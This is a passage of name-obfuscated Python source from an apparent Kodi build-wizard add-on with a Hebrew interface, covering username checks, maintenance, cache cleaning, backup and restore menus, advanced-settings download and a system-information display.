						STARTP ()#line:2414
						sys .exit ()#line:2415
					else :#line:2416
						sys .exit ()#line:2417
	return 'ok'#line:2421
def STARTP2 ():#line:2422
	OOOOOOOO0O0O0000O =(ADDON .getSetting ("user"))#line:2423
	O0000OO00O0OOO00O =(UNAME )#line:2425
	O000O00000O00OOO0 =urllib2 .urlopen (O0000OO00O0OOO00O )#line:2426
	O0000OO000O00O0OO =O000O00000O00OOO0 .readlines ()#line:2427
	OO0O0OOO0OOO000OO =0 #line:2428
	for O00O00OO00OOOOOO0 in O0000OO000O00O0OO :#line:2431
		if O00O00OO00OOOOOO0 .split (' ==')[0 ]==OOOOOOOO0O0O0000O or O00O00OO00OOOOOO0 .split ()[0 ]==OOOOOOOO0O0O0000O :#line:2432
			OO0O0OOO0OOO000OO =1 #line:2433
			break #line:2434
	if OO0O0OOO0OOO000OO ==0 :#line:2435
		O000O0OO0O00O0O0O =DIALOG .yesno ("%s"%ADDONTITLE ,"[COLOR %s]שם המתשמש שהוכנס אינו נכון,"%(COLOR2 ),"הכנס את שם המשתמש כעת[/COLOR]",nolabel ='[B][COLOR white]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]אישור[/COLOR][/B]')#line:2436
		if O000O0OO0O00O0O0O :#line:2438
			ADDON .openSettings ()#line:2440
			STARTP2 ()#line:2442
			sys .exit ()#line:2443
		else :#line:2444
			sys .exit ()#line:2445
	return 'ok'#line:2449
def passandpin ():#line:2450
	addFile ('קבל קוד אימות','getpass',name ,'getpass',themeit =THEME1 )#line:2451
	addFile ('הכנס שם משתמש','setuname',name ,'setuname',themeit =THEME1 )#line:2452
	addFile ('הכנס סיסמה','setpass',name ,'setpass',themeit =THEME1 )#line:2453
def passandUsername ():#line:2454
	ADDON .openSettings ()#line:2455
def folderback ():#line:2458
    OO0OOOOOOO00000O0 =ADDON .getSetting ("path")#line:2459
    if OO0OOOOOOO00000O0 :#line:2460
      OO0OOOOOOO00000O0 =xbmcgui .Dialog ().browse (0 ,"בחר תקייה",'files','',False ,False ,HOME )#line:2461
      ADDON .setSetting ("path",OO0OOOOOOO00000O0 )#line:2462
def backmyupbuild ():#line:2465
		addFile ('מחק את תיקיית הגיבוי שלי','clearbackup',icon =ICONMAINT ,themeit =THEME3 )#line:2469
		addFile ('[COLOR %s]%s[/COLOR]מיקום גיבוי: '%(COLOR2 ,MYBUILDS ),'folderback','Maintenance',icon =ICONMAINT ,themeit =THEME3 )#line:2470
		addFile ('גיבוי בילד שלם','backupbuild',icon =ICONMAINT ,themeit =THEME3 )#line:2471
		addFile ('גיבוי הגדרות סקין ותפריטים בלבד','backuptheme',icon =ICONMAINT ,themeit =THEME3 )#line:2473
		addFile ('גיבוי הגדרות של הרחבות כולל תפריטים וסיסמאות','backupaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2474
		addFile ('שחזור בילד שלם','restorezip',icon =ICONMAINT ,themeit =THEME3 )#line:2475
		addFile ('שחזור הגדרות','restoreaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2477
def maintMenu (view =None ):#line:2481
	O0000O0000OO000O0 ='[B][COLOR green]ON[/COLOR][/B]';OO0O000O000O0OOOO ='[B][COLOR red]OFF[/COLOR][/B]'#line:2483
	OO00OOOOOO00O0OOO ='true'if AUTOCLEANUP =='true'else 'false'#line:2484
	OOOOO000000OO000O ='true'if AUTOCACHE =='true'else 'false'#line:2485
	OO0OO00OO00OO0O00 ='true'if AUTOPACKAGES =='true'else 'false'#line:2486
	O0O0OOOOOO0O0OO00 ='true'if AUTOTHUMBS =='true'else 'false'#line:2487
	OOO000O0OO0O00OOO ='true'if SHOWMAINT =='true'else 'false'#line:2488
	O00000OOO00OO0O0O ='true'if INCLUDEVIDEO =='true'else 'false'#line:2489
	OO0OO0OO000OO00OO ='true'if INCLUDEALL =='true'else 'false'#line:2490
	O00000OOOOOOOOO0O ='true'if THIRDPARTY =='true'else 'false'#line:2491
	if wiz .Grab_Log (True )==False :OO000OO00O00OO0O0 =0 #line:2492
	else :OO000OO00O00OO0O0 =errorChecking (wiz .Grab_Log (True ),True ,True )#line:2493
	if wiz .Grab_Log (True ,True )==False :O0O0OOOO00000000O =0 #line:2494
	else :O0O0OOOO00000000O =errorChecking (wiz .Grab_Log (True ,True ),True ,True )#line:2495
	O00O00OO0O0O00OOO =int (OO000OO00O00OO0O0 )+int (O0O0OOOO00000000O )#line:2496
	OO000OOOOOO0O0O00 =str (O00O00OO0O0O00OOO )+' Error(s) Found'if O00O00OO0O0O00OOO >0 else 'None Found'#line:2497
	OO0000OOO0O0O000O =': [COLOR red]Not Found[/COLOR]'if not os .path .exists (WIZLOG )else ": [COLOR green]%s[/COLOR]"%wiz .convertSize (os .path .getsize (WIZLOG ))#line:2498
	if OO0OO0OO000OO00OO =='true':#line:2499
		OO0O00O00O0O0OOO0 ='true'#line:2500
		O0000OOO0OOOOO00O ='true'#line:2501
		OOO0OO0O0O0O0O0O0 ='true'#line:2502
		OO000000OO000OOOO ='true'#line:2503
		OOOO00O00O00OOO0O ='true'#line:2504
		OOOO0OOOOOOO0OO00 ='true'#line:2505
		OO0O0OOOOOOOO00OO ='true'#line:2506
		O000O000OOOO00000 ='true'#line:2507
	else :#line:2508
		OO0O00O00O0O0OOO0 ='true'if INCLUDEBOB =='true'else 'false'#line:2509
		O0000OOO0OOOOO00O ='true'if INCLUDEPHOENIX =='true'else 'false'#line:2510
		OOO0OO0O0O0O0O0O0 ='true'if INCLUDESPECTO =='true'else 'false'#line:2511
		OO000000OO000OOOO ='true'if INCLUDEGENESIS =='true'else 'false'#line:2512
		OOOO00O00O00OOO0O ='true'if INCLUDEEXODUS =='true'else 'false'#line:2513
		OOOO0OOOOOOO0OO00 ='true'if INCLUDEONECHAN =='true'else 'false'#line:2514
		OO0O0OOOOOOOO00OO ='true'if INCLUDESALTS =='true'else 'false'#line:2515
		O000O000OOOO00000 ='true'if INCLUDESALTSHD =='true'else 'false'#line:2516
	O00O000O0OO000OOO =wiz .getSize (PACKAGES )#line:2517
	OOO0O0000OO0O0OOO =wiz .getSize (THUMBS )#line:2518
	O0000O000OOO0O0OO =wiz .getCacheSize ()#line:2519
	O000OOO00OOO00OOO =O00O000O0OO000OOO +OOO0O0000OO0O0OOO +O0000O000OOO0O0OO #line:2520
	OO0O0OOO00O000OO0 =['Daily','Always','3 Days','Weekly']#line:2521
	addDir ('[B]Cleaning Tools[/B]','maint','clean',icon =ICONMAINT ,themeit =THEME1 )#line:2522
	if view =="clean"or SHOWMAINT =='true':#line:2523
		addFile ('ניקוי מלא: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (O000OOO00OOO00OOO ),'fullclean',icon =ICONMAINT ,themeit =THEME3 )#line:2524
		addFile ('ניקוי קאש: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (O0000O000OOO0O0OO ),'clearcache',icon =ICONMAINT ,themeit =THEME3 )#line:2525
		addFile ('ניקוי חבילות: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (O00O000O0OO000OOO ),'clearpackages',icon =ICONMAINT ,themeit =THEME3 )#line:2526
		addFile ('ניקוי תמונות: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (OOO0O0000OO0O0OOO ),'clearthumb',icon =ICONMAINT ,themeit =THEME3 )#line:2527
		addFile ('ניקוי תמונות ישנות','oldThumbs',icon =ICONMAINT ,themeit =THEME3 )#line:2528
		addFile ('ניקוי קאש לוג','clearcrash',icon =ICONMAINT ,themeit =THEME3 )#line:2529
		addFile ('ניקוי חבילות ישנות','purgedb',icon =ICONMAINT ,themeit =THEME3 )#line:2530
		addFile ('התקנה נקיה','freshstart',icon =ICONMAINT ,themeit =THEME3 )#line:2531
	addDir ('[B]Addon Tools[/B]','maint','addon',icon =ICONMAINT ,themeit =THEME1 )#line:2532
	if view =="addon"or SHOWMAINT =='false':#line:2533
		addFile ('הסרת הרחבות','removeaddons',icon =ICONMAINT ,themeit =THEME3 )#line:2534
		addDir ('הסרת מידע הרחבות','removeaddondata',icon =ICONMAINT ,themeit =THEME3 )#line:2535
		addDir ('הפעלה או ביטול הרחבות','enableaddons',icon =ICONMAINT ,themeit =THEME3 )#line:2536
		addFile ('Enable/Disable Adult Addons','toggleadult',icon =ICONMAINT ,themeit =THEME3 )#line:2537
		addFile ('בודק עדכונים','forceupdate',icon =ICONMAINT ,themeit =THEME3 )#line:2538
		addFile ('Hide Passwords On Keyboard Entry','hidepassword',icon =ICONMAINT ,themeit =THEME3 )#line:2539
		addFile ('Unhide Passwords On Keyboard Entry','unhidepassword',icon =ICONMAINT ,themeit =THEME3 )#line:2540
	addDir ('[B]Misc Maintenance[/B]','maint','misc',icon =ICONMAINT ,themeit =THEME1 )#line:2541
	if view =="misc"or SHOWMAINT =='true':#line:2542
		addFile ('Kodi 17 Fix','kodi17fix',icon =ICONMAINT ,themeit =THEME3 )#line:2543
		addFile ('Reload Skin','forceskin',icon =ICONMAINT ,themeit =THEME3 )#line:2544
		addFile ('Reload Profile','forceprofile',icon =ICONMAINT ,themeit =THEME3 )#line:2545
		addFile ('Force Close Kodi','forceclose',icon =ICONMAINT ,themeit =THEME3 )#line:2546
		addFile ('Upload Kodi.log','uploadlog',icon =ICONMAINT ,themeit =THEME3 )#line:2547
		addFile ('View Errors in Log: %s'%(OO000OOOOOO0O0O00 ),'viewerrorlog',icon =ICONMAINT ,themeit =THEME3 )#line:2548
		addFile ('View Log File','viewlog',icon =ICONMAINT ,themeit =THEME3 )#line:2549
		addFile ('View Wizard Log File','viewwizlog',icon =ICONMAINT ,themeit =THEME3 )#line:2550
		addFile ('Clear Wizard Log File%s'%OO0000OOO0O0O000O ,'clearwizlog',icon =ICONMAINT ,themeit =THEME3 )#line:2551
	addDir ('[B]שחזור וגיבוי[/B]','maint','backup',icon =ICONMAINT ,themeit =THEME1 )#line:2552
	if view =="backup"or SHOWMAINT =='true':#line:2553
		addFile ('Clean Up Back Up Folder','clearbackup',icon =ICONMAINT ,themeit =THEME3 )#line:2554
		addFile ('Back Up Location: [COLOR %s]%s[/COLOR]'%(COLOR2 ,MYBUILDS ),'settings','Maintenance',icon =ICONMAINT ,themeit =THEME3 )#line:2555
		addFile ('[גיבוי]: בילד','backupbuild',icon =ICONMAINT ,themeit =THEME3 )#line:2556
		addFile ('[גיבוי]: פרופילים','backupgui',icon =ICONMAINT ,themeit =THEME3 )#line:2557
		addFile ('[גיבוי]: סקינים','backuptheme',icon =ICONMAINT ,themeit =THEME3 )#line:2558
		addFile ('[גיבוי]: אדון דאטה','backupaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2559
		addFile ('[שחזור]: בילד מתיקיה מקומית','restorezip',icon =ICONMAINT ,themeit =THEME3 )#line:2560
		addFile ('[שחזור]: פרופילים מתיקיה מקומית','restoregui',icon =ICONMAINT ,themeit =THEME3 )#line:2561
		addFile ('[שחזור]: אדון דאטה מתיקיה מקומית','restoreaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2562
		addFile ('[שחזור]: בילד מתיקיה חיצונית','restoreextzip',icon =ICONMAINT ,themeit =THEME3 )#line:2563
		addFile ('[שחזור]: פרופילים מתיקיה חיצונית','restoreextgui',icon =ICONMAINT ,themeit =THEME3 )#line:2564
		addFile ('[שחזור]: אדון דאטה מתיקיה חיצונית','restoreextaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2565
	addDir ('[B]System Tweaks/Fixes[/B]','maint','tweaks',icon =ICONMAINT ,themeit =THEME1 )#line:2566
	if view =="tweaks"or SHOWMAINT =='true':#line:2567
		if not ADVANCEDFILE =='http://'and not ADVANCEDFILE =='':#line:2568
			addDir ('Advanced Settings','advancedsetting',icon =ICONMAINT ,themeit =THEME3 )#line:2569
		else :#line:2570
			if os .path .exists (ADVANCED ):#line:2571
				addFile ('View Currect AdvancedSettings.xml','currentsettings',icon =ICONMAINT ,themeit =THEME3 )#line:2572
				addFile ('Remove Currect AdvancedSettings.xml','removeadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:2573
			addFile ('Quick Configure AdvancedSettings.xml','autoadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:2574
		addFile ('Scan Sources for broken links','checksources',icon =ICONMAINT ,themeit =THEME3 )#line:2575
		addFile ('Scan For Broken Repositories','checkrepos',icon =ICONMAINT ,themeit =THEME3 )#line:2576
		addFile ('Fix Addons Not Updating','fixaddonupdate',icon =ICONMAINT ,themeit =THEME3 )#line:2577
		addFile ('Remove Non-Ascii filenames','asciicheck',icon =ICONMAINT ,themeit =THEME3 )#line:2578
		addFile ('Convert Paths to special','convertpath',icon =ICONMAINT ,themeit =THEME3 )#line:2579
		addDir ('System Information','systeminfo',icon =ICONMAINT ,themeit =THEME3 )#line:2580
	addFile ('Show All Maintenance: %s'%OOO000O0OO0O00OOO .replace ('true',O0000O0000OO000O0 ).replace ('false',OO0O000O000O0OOOO ),'togglesetting','showmaint',icon =ICONMAINT ,themeit =THEME2 )#line:2581
	addDir ('[I]<< Return to Main Menu[/I]',icon =ICONMAINT ,themeit =THEME2 )#line:2582
	addFile ('Third Party Wizards: %s'%O00000OOOOOOOOO0O .replace ('true',O0000O0000OO000O0 ).replace ('false',OO0O000O000O0OOOO ),'togglesetting','enable3rd',fanart =FANART ,icon =ICONMAINT ,themeit =THEME1 )#line:2583
	if O00000OOOOOOOOO0O =='true':#line:2584
		O00O00O000O00OOO0 =THIRD1NAME if not THIRD1NAME ==''else 'Not Set'#line:2585
		OOOOO00O00O000OO0 =THIRD2NAME if not THIRD2NAME ==''else 'Not Set'#line:2586
		OO00OO0O0OO0OOO0O =THIRD3NAME if not THIRD3NAME ==''else 'Not Set'#line:2587
		addFile ('Edit Third Party Wizard 1: [COLOR %s]%s[/COLOR]'%(COLOR2 ,O00O00O000O00OOO0 ),'editthird','1',icon =ICONMAINT ,themeit =THEME3 )#line:2588
		addFile ('Edit Third Party Wizard 2: [COLOR %s]%s[/COLOR]'%(COLOR2 ,OOOOO00O00O000OO0 ),'editthird','2',icon =ICONMAINT ,themeit =THEME3 )#line:2589
		addFile ('Edit Third Party Wizard 3: [COLOR %s]%s[/COLOR]'%(COLOR2 ,OO00OO0O0OO0OOO0O ),'editthird','3',icon =ICONMAINT ,themeit =THEME3 )#line:2590
	addFile ('ניקוי אוטומטי','',fanart =FANART ,icon =ICONMAINT ,themeit =THEME1 )#line:2591
	addFile ('ניקוי אוטומטי בהפעלה: %s'%OO00OOOOOO00O0OOO .replace ('true',O0000O0000OO000O0 ).replace ('false',OO0O000O000O0OOOO ),'togglesetting','autoclean',icon =ICONMAINT ,themeit =THEME3 )#line:2592
	if OO00OOOOOO00O0OOO =='true':#line:2593
		addFile ('--- תדירות ניקוי: [B][COLOR green]%s[/COLOR][/B]'%OO0O0OOO00O000OO0 [AUTOFEQ ],'changefeq',icon =ICONMAINT ,themeit =THEME3 )#line:2594
		addFile ('--- ניקוי קאש בהפעלה: %s'%OOOOO000000OO000O .replace ('true',O0000O0000OO000O0 ).replace ('false',OO0O000O000O0OOOO ),'togglesetting','clearcache',icon =ICONMAINT ,themeit =THEME3 )#line:2595
		addFile ('--- ניקוי חבילות בהפעלה: %s'%OO0OO00OO00OO0O00 .replace ('true',O0000O0000OO000O0 ).replace ('false',OO0O000O000O0OOOO ),'togglesetting','clearpackages',icon =ICONMAINT ,themeit =THEME3 )#line:2596
		addFile ('--- ניקוי תמונות ישנות בהפעלה: %s'%O0O0OOOOOO0O0OO00 .replace ('true',O0000O0000OO000O0 ).replace ('false',OO0O000O000O0OOOO ),'togglesetting','clearthumbs',icon =ICONMAINT ,themeit =THEME3 )#line:2597
	addFile ('ניקוי וידאו קאש','',fanart =FANART ,icon =ICONMAINT ,themeit =THEME1 )#line:2598
	addFile ('Include Video Cache in Clear Cache: %s'%O00000OOO00OO0O0O .replace ('true',O0000O0000OO000O0 ).replace ('false',OO0O000O000O0OOOO ),'togglecache','includevideo',icon =ICONMAINT ,themeit =THEME3 )#line:2599
	if O00000OOO00OO0O0O =='true':#line:2600
		addFile ('--- Include All Video Addons: %s'%OO0OO0OO000OO00OO .replace ('true',O0000O0000OO000O0 ).replace ('false',OO0O000O000O0OOOO ),'togglecache','includeall',icon =ICONMAINT ,themeit =THEME3 )#line:2601
		addFile ('--- Include Bob: %s'%OO0O00O00O0O0OOO0 .replace ('true',O0000O0000OO000O0 ).replace ('false',OO0O000O000O0OOOO ),'togglecache','includebob',icon =ICONMAINT ,themeit =THEME3 )#line:2602
		addFile ('--- Include Phoenix: %s'%O0000OOO0OOOOO00O .replace ('true',O0000O0000OO000O0 ).replace ('false',OO0O000O000O0OOOO ),'togglecache','includephoenix',icon =ICONMAINT ,themeit =THEME3 )#line:2603
		addFile ('--- Include Specto: %s'%OOO0OO0O0O0O0O0O0 .replace ('true',O0000O0000OO000O0 ).replace ('false',OO0O000O000O0OOOO ),'togglecache','includespecto',icon =ICONMAINT ,themeit =THEME3 )#line:2604
		addFile ('--- Include Exodus: %s'%OOOO00O00O00OOO0O .replace ('true',O0000O0000OO000O0 ).replace ('false',OO0O000O000O0OOOO ),'togglecache','includeexodus',icon =ICONMAINT ,themeit =THEME3 )#line:2605
		addFile ('--- Include Salts: %s'%OO0O0OOOOOOOO00OO .replace ('true',O0000O0000OO000O0 ).replace ('false',OO0O000O000O0OOOO ),'togglecache','includesalts',icon =ICONMAINT ,themeit =THEME3 )#line:2606
		addFile ('--- Include Salts HD Lite: %s'%O000O000OOOO00000 .replace ('true',O0000O0000OO000O0 ).replace ('false',OO0O000O000O0OOOO ),'togglecache','includesaltslite',icon =ICONMAINT ,themeit =THEME3 )#line:2607
		addFile ('--- Include One Channel: %s'%OOOO0OOOOOOO0OO00 .replace ('true',O0000O0000OO000O0 ).replace ('false',OO0O000O000O0OOOO ),'togglecache','includeonechan',icon =ICONMAINT ,themeit =THEME3 )#line:2608
		addFile ('--- Include Genesis: %s'%OO000000OO000OOOO .replace ('true',O0000O0000OO000O0 ).replace ('false',OO0O000O000O0OOOO ),'togglecache','includegenesis',icon =ICONMAINT ,themeit =THEME3 )#line:2609
		addFile ('--- Enable All Video Addons','togglecache','true',icon =ICONMAINT ,themeit =THEME3 )#line:2610
		addFile ('--- Disable All Video Addons','togglecache','false',icon =ICONMAINT ,themeit =THEME3 )#line:2611
	setView ('files','viewType')#line:2612
def advancedWindow (url =None ):#line:2614
	if not ADVANCEDFILE =='http://':#line:2615
		if url ==None :#line:2616
			O0O00OOO0000O0OO0 =wiz .workingURL (ADVANCEDFILE )#line:2617
			OO00O0O0O000OO000 =uservar .ADVANCEDFILE #line:2618
		else :#line:2619
			O0O00OOO0000O0OO0 =wiz .workingURL (url )#line:2620
			OO00O0O0O000OO000 =url #line:2621
		addFile ('Quick Configure AdvancedSettings.xml','autoadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:2622
		if os .path .exists (ADVANCED ):#line:2623
			addFile ('View Currect AdvancedSettings.xml','currentsettings',icon =ICONMAINT ,themeit =THEME3 )#line:2624
			addFile ('Remove Currect AdvancedSettings.xml','removeadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:2625
		if O0O00OOO0000O0OO0 ==True :#line:2626
			if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONMAINT ,themeit =THEME3 )#line:2627
			O00000OOOO00O0O0O =wiz .openURL (OO00O0O0O000OO000 ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2628
			OO00OO000OO000000 =re .compile ('name="(.+?)".+?ection="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?escription="(.+?)"').findall (O00000OOOO00O0O0O )#line:2629
			if len (OO00OO000OO000000 )>0 :#line:2630
				for O0O000OO00OO0OO00 ,O00O0OO0OOOOOOO00 ,url ,O00000O000000OOO0 ,OOO00000OO0O00O00 ,OO00OOO00OOO00O00 in OO00OO000OO000000 :#line:2631
					if O00O0OO0OOOOOOO00 .lower ()=="yes":#line:2632
						addDir ("[B]%s[/B]"%O0O000OO00OO0OO00 ,'advancedsetting',url ,description =OO00OOO00OOO00O00 ,icon =O00000O000000OOO0 ,fanart =OOO00000OO0O00O00 ,themeit =THEME3 )#line:2633
					else :#line:2634
						addFile (O0O000OO00OO0OO00 ,'writeadvanced',O0O000OO00OO0OO00 ,url ,description =OO00OOO00OOO00O00 ,icon =O00000O000000OOO0 ,fanart =OOO00000OO0O00O00 ,themeit =THEME2 )#line:2635
			else :wiz .log ("[Advanced Settings] ERROR: Invalid Format.")#line:2636
		else :wiz .log ("[Advanced Settings] URL not working: %s"%O0O00OOO0000O0OO0 )#line:2637
	else :wiz .log ("[Advanced Settings] not Enabled")#line:2638
def writeAdvanced (OOOO0OOO00O0000OO ,OO0O0000O000O0O00 ):#line:2640
	O00O0000O0000O00O =wiz .workingURL (OO0O0000O000O0O00 )#line:2641
	if O00O0000O0000O00O ==True :#line:2642
		if os .path .exists (ADVANCED ):OO0OOO0OOOOOO0OOO =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to overwrite your current Advanced Settings with [COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,OOOO0OOO00O0000OO ),yeslabel ="[B][COLOR green]Overwrite[/COLOR][/B]",nolabel ="[B][COLOR red]Cancel[/COLOR][/B]")#line:2643
		else :OO0OOO0OOOOOO0OOO =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]האם תרצה להוריד ולהתקין [COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,OOOO0OOO00O0000OO ),yeslabel ="[B][COLOR green]התקנה[/COLOR][/B]",nolabel ="[B][COLOR red]ביטול[/COLOR][/B]")#line:2644
		if OO0OOO0OOOOOO0OOO ==1 :#line:2646
			OOO0O0OOOO0O0OO0O =wiz .openURL (OO0O0000O000O0O00 )#line:2647
			O0O00000OOOOOO00O =open (ADVANCED ,'w');#line:2648
			O0O00000OOOOOO00O .write (OOO0O0OOOO0O0OO0O )#line:2649
			O0O00000OOOOOO00O .close ()#line:2650
			DIALOG .ok (ADDONTITLE ,'[COLOR %s]AdvancedSettings.xml file has been successfully written.  Once you click okay it will force close kodi.[/COLOR]'%COLOR2 )#line:2651
			wiz .killxbmc (True )#line:2652
		else :wiz .log ("[Advanced Settings] install canceled");wiz .LogNotify ('[COLOR %s]%s[/COLOR]'%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Write Cancelled![/COLOR]"%COLOR2 );return #line:2653
	else :wiz .log ("[Advanced Settings] URL not working: %s"%O00O0000O0000O00O );wiz .LogNotify ('[COLOR %s]%s[/COLOR]'%(COLOR1 ,ADDONTITLE ),"[COLOR %s]URL Not Working[/COLOR]"%COLOR2 )#line:2654
def viewAdvanced ():#line:2656
	OOO00OOO0O0O0OO00 =open (ADVANCED )#line:2657
	OO00OO0OOOOO000OO =OOO00OOO0O0O0OO00 .read ().replace ('\t','    ')#line:2658
	wiz .TextBox (ADDONTITLE ,OO00OO0OOOOO000OO )#line:2659
	OOO00OOO0O0O0OO00 .close ()#line:2660
def removeAdvanced ():#line:2662
	if os .path .exists (ADVANCED ):#line:2663
		wiz .removeFile (ADVANCED )#line:2664
	else :LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]AdvancedSettings.xml not found[/COLOR]")#line:2665
def showAutoAdvanced ():#line:2667
	notify .autoConfig ()#line:2668
def getIP ():#line:2670
	O00000O0O000OO000 ='http://whatismyipaddress.com/'#line:2671
	if not wiz .workingURL (O00000O0O000OO000 ):return 'Unknown','Unknown','Unknown'#line:2672
	OOO0O00O0OOOO00OO =wiz .openURL (O00000O0O000OO000 ).replace ('\n','').replace ('\r','')#line:2673
	if not 'Access Denied'in OOO0O00O0OOOO00OO :#line:2674
		OO0O0O0OO0OOOO0O0 =re .compile ('whatismyipaddress.com/ip/(.+?)"').findall (OOO0O00O0OOOO00OO )#line:2675
		O0OO0O0O000OOO0O0 =OO0O0O0OO0OOOO0O0 [0 ]if (len (OO0O0O0OO0OOOO0O0 )>0 )else 'Unknown'#line:2676
		OO00OO0O0OOO0O00O =re .compile ('"font-size:14px;">(.+?)</td>').findall (OOO0O00O0OOOO00OO )#line:2677
		O0O000000OOO00O0O =OO00OO0O0OOO0O00O [0 ]if (len (OO00OO0O0OOO0O00O )>0 )else 'Unknown'#line:2678
		O00O0O0OO0000OO00 =OO00OO0O0OOO0O00O [1 ]+', '+OO00OO0O0OOO0O00O [2 ]+', '+OO00OO0O0OOO0O00O [3 ]if (len (OO00OO0O0OOO0O00O )>2 )else 'Unknown'#line:2679
		return O0OO0O0O000OOO0O0 ,O0O000000OOO00O0O ,O00O0O0OO0000OO00 #line:2680
	else :return 'Unknown','Unknown','Unknown'#line:2681
def systemInfo ():#line:2683
	OOO00OO0O0O0O0000 =['System.FriendlyName','System.BuildVersion','System.CpuUsage','System.ScreenMode','Network.IPAddress','Network.MacAddress','System.Uptime','System.TotalUptime','System.FreeSpace','System.UsedSpace','System.TotalSpace','System.Memory(free)','System.Memory(used)','System.Memory(total)']#line:2697
	OO0OO0O000O000O00 =[];O000O00OOOOO0O00O =0 #line:2698
	for OO00OOO00O0OO000O in OOO00OO0O0O0O0000 :#line:2699
		O00O00O0OO0OOOO0O =wiz .getInfo (OO00OOO00O0OO000O )#line:2700
		O000O0OOOO000O000 =0 #line:2701
		while O00O00O0OO0OOOO0O =="Busy"and O000O0OOOO000O000 <10 :#line:2702
			O00O00O0OO0OOOO0O =wiz .getInfo (OO00OOO00O0OO000O );O000O0OOOO000O000 +=1 ;wiz .log ("%s sleep %s"%(OO00OOO00O0OO000O ,str (O000O0OOOO000O000 )));xbmc .sleep (1000 )#line:2703
		OO0OO0O000O000O00 .append (O00O00O0OO0OOOO0O )#line:2704
		O000O00OOOOO0O00O +=1 #line:2705
	O0OO0O0O00O0OOOOO =OO0OO0O000O000O00 [8 ]if 'Una'in OO0OO0O000O000O00 [8 ]else wiz .convertSize (int (float (OO0OO0O000O000O00 [8 ][:-8 ]))*1024 *1024 )#line:2706
	O0O0O000O0OOO0OOO =OO0OO0O000O000O00 [9 ]if 'Una'in OO0OO0O000O000O00 [9 ]else wiz .convertSize (int (float (OO0OO0O000O000O00 [9 ][:-8 ]))*1024 *1024 )#line:2707
	OOOO000O000OO0O0O =OO0OO0O000O000O00 [10 ]if 'Una'in OO0OO0O000O000O00 [10 ]else wiz .convertSize (int (float (OO0OO0O000O000O00 [10 ][:-8 ]))*1024 *1024 )#line:2708
	O0000OO00O0O000O0 =wiz .convertSize (int (float (OO0OO0O000O000O00 [11 ][:-2 ]))*1024 *1024 )#line:2709
	OOOOOO0O000OO00OO =wiz .convertSize (int (float (OO0OO0O000O000O00 [12 ][:-2 ]))*1024 *1024 )#line:2710
	OOOOO00OOO000O000 =wiz .convertSize (int (float (OO0OO0O000O000O00 [13 ][:-2 ]))*1024 *1024 )#line:2711
	O00000OOO00O00000 ,OO0O0OOO0000O0OOO ,OO0OOO0O0O0OO00O0 =getIP ()#line:2712
	O00OO0O0OOO000000 =[];O0O0O0OO00OOOOOOO =[];O00O0O0OOOOO0O0O0 =[];O0000OO00OO0000O0 =[];O000O0O0O0OOOOO0O =[];OOO0O0OOO00O0OO00 =[];O0OO000O00OOOO00O =[]#line:2714
	OO0O00OO00OOOOOOO =glob .glob (os .path .join (ADDONS ,'*/'))#line:2716
	for O0O0O0O0OO0O000O0 in sorted (OO0O00OO00OOOOOOO ,key =lambda OO0O0O0O00OO0OOO0 :OO0O0O0O00OO0OOO0 ):#line:2717
		OO0000O0OOOOO00OO =os .path .split (O0O0O0O0OO0O000O0 [:-1 ])[1 ]#line:2718
		if OO0000O0OOOOO00OO =='packages':continue #line:2719
		O000O000OO0OOOOOO =os .path .join (O0O0O0O0OO0O000O0 ,'addon.xml')#line:2720
		if os .path .exists (O000O000OO0OOOOOO ):#line:2721
			O00000OO0000O0O00 =open (O000O000OO0OOOOOO )#line:2722
			OO0O0O0O0000O0O00 =O00000OO0000O0O00 .read ()#line:2723
			O00OO00O0O0O0OOOO =re .compile ("<provides>(.+?)</provides>").findall (OO0O0O0O0000O0O00 )#line:2724
			if len (O00OO00O0O0O0OOOO )==0 :#line:2725
				if OO0000O0OOOOO00OO .startswith ('skin'):O0OO000O00OOOO00O .append (OO0000O0OOOOO00OO )#line:2726
				if OO0000O0OOOOO00OO .startswith ('repo'):O000O0O0O0OOOOO0O .append (OO0000O0OOOOO00OO )#line:2727
				else :OOO0O0OOO00O0OO00 .append (OO0000O0OOOOO00OO )#line:2728
			elif not (O00OO00O0O0O0OOOO [0 ]).find ('executable')==-1 :O0000OO00OO0000O0 .append (OO0000O0OOOOO00OO )#line:2729
			elif not (O00OO00O0O0O0OOOO [0 ]).find ('video')==-1 :O00O0O0OOOOO0O0O0 .append (OO0000O0OOOOO00OO )#line:2730
			elif not (O00OO00O0O0O0OOOO [0 ]).find ('audio')==-1 :O0O0O0OO00OOOOOOO .append (OO0000O0OOOOO00OO )#line:2731
			elif not (O00OO00O0O0O0OOOO [0 ]).find ('image')==-1 :O00OO0O0OOO000000 .append (OO0000O0OOOOO00OO )#line:2732
	addFile ('[B]Media Center Info:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:2734
	addFile ('[COLOR %s]Name:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO0OO0O000O000O00 [0 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:2735
	addFile ('[COLOR %s]Version:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO0OO0O000O000O00 [1 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:2736
